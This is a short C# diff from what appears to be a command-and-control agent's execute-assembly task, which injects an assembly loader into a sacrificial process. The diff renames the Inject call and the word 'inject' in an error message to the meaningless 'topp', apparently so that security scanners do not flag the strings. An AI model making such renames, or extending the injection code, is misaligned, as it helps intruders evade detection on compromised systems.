@@ -215,9 +215,9 @@ namespace Tasks
                         )
                     );
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Injecting stub..."));
-                if (!proc.Inject(exeAsmPic))
+                if (!proc.topp(exeAsmPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to inject assembly loader into sacrificial process {info.Application}.");
+                    throw new ExecuteAssemblyException($"Failed to topp assembly loader into sacrificial process {info.Application}.");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
